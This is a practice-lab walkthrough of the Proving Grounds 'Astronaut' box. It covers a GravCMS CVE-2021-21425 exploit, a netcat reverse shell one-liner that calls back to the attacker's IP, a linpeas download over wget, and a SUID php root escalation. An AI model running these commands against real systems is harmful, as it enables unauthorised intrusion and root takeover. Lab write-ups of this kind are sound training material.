---
title: Astronaut- Easy - Linux - PG Practice
date: 2024-06-10
tags:
  - pg-practice
  - offsec
  - oscp-prep
  - linux
  - ospg
  - php
draft: false
---
# Astronaut - Easy - Linux - PG Practice

# **Scanning**

My basic scan runs the following command
```bash
nmap -sC -T5 -Pn -p- --min-rate=10000 $IP
```

```bash
┌──(kali㉿kali)-[~/…/PGPractice/Easy/Linux/Astronaut]
└─$ basic 192.168.162.12 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-10 08:34 EDT
Warning: 192.168.162.12 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.162.12
Host is up (0.18s latency).
Not shown: 37816 filtered tcp ports (no-response), 27717 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 984e5de1e697296fd9e0d482a8f64f3f (RSA)
|   256 5723571ffd7706be256661146dae5e98 (ECDSA)
|_  256 c79baad5a6333591341eefcf61a8301c (ED25519)
80/tcp open  http
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_

Nmap done: 1 IP address (1 host up) scanned in 38.03 seconds
```

	`GravCMS` is being used at Port 80

A little googling about GravCMS exploit gets us to the following exploit
[GravCMS Unauthenticated Arbitrary YAML Write/Update leads to Code Execution (CVE-2021-21425)](https://github.com/CsEnox/CVE-2021-21425)
# **Exploitation**

We simply clone the repo at our local machine
```bash
┌──(kali㉿kali)-[~/…/PGPractice/Easy/Linux/Astronaut]
└─$ git clone https://github.com/CsEnox/CVE-2021-21425.git
```

The exploit takes two parameters as inputs
```bash
┌──(kali㉿kali)-[~/…/Easy/Linux/Astronaut/CVE-2021-21425]
└─$ python3 exploit.py                                                              
usage: exploit.py [-h] -c C -t T
exploit.py: error: the following arguments are required: -c, -t
```

Where `-c` is the command you want to run and `-it` is target you want to exploit.

Our final command becomes
```bash
┌──(kali㉿kali)-[~/…/Easy/Linux/Astronaut/CVE-2021-21425]
└─$ python3 exploit.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $YOURIP $YOURPORT >/tmp/f' -t http://192.168.162.12/grav-admin

[*] Creating File
Scheduled task created for file creation, wait one minute
[*] Running file
Scheduled task created for command, wait one minute
Exploit completed
```

Here the revshell was built using [revshells.com](revshells.com)

By listening on a port using `nc -lnvp $port` we simply catch the connection with `www-data` user.
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 2222
listening on [any] 2222 ...
connect to [192.168.45.197] from (UNKNOWN) [192.168.162.12] 60686
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
# **Privilege Escalation**

We stabilize the shell using the following python command
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now we get a proper interactive shell
```python
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@gravity:~/html/grav-admin$ whoami
whoami
www-data
```

For privilege escalation, I like to use `linpeas.sh` since it offers a lot of information in a single script. I use `wget` to download the script from my local machine to `/tmp` directory on `www-data`. You can run a local server using `python3 -m http.server` in the directory containing the linpeas file.

```python
www-data@gravity:/tmp$ wget http://IP:8000/linpeas.sh
wget http://IP:8000/linpeas.sh
--2024-06-10 12:45:40--  http://IP:8000/linpeas.sh
Connecting to IP:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 847924 (828K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 828.05K   241KB/s    in 3.4s    

2024-06-10 12:45:44 (241 KB/s) - ‘linpeas.sh’ saved [847924/847924]
```

Now giving it `+x` permissions and running it.
```python
www-data@gravity:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@gravity:/tmp$ ./linpeas.sh
./linpeas.sh
```

Running it showed an interesting juicy info in the `SUID` data.
```python
-rwsr-xr-x 1 root root 4.6M Feb 23  2023 /usr/bin/php7.4 (Unknown SUID binary!)
```

PHP 7.4 is a vulnerable SUID which can be exploited for `root`. Using [GTFObins](https://gtfobins.github.io/gtfobins/php/) we get the right exploit for our root `hehe`

```php
CMD="/bin/sh" 
php -r "pcntl_exec('/bin/sh', ['-p']);"
```

Running these commands gives us an easy root
```python
www-data@gravity:/tmp$ CMD="/bin/sh"
CMD="/bin/sh"
www-data@gravity:/tmp$ php -r "pcntl_exec('/bin/sh', ['-p']);"
php -r "pcntl_exec('/bin/sh', ['-p']);"
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
flag1.txt  proof.txt  snap
# cat proof.txt
cat proof.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

This was easy ngl.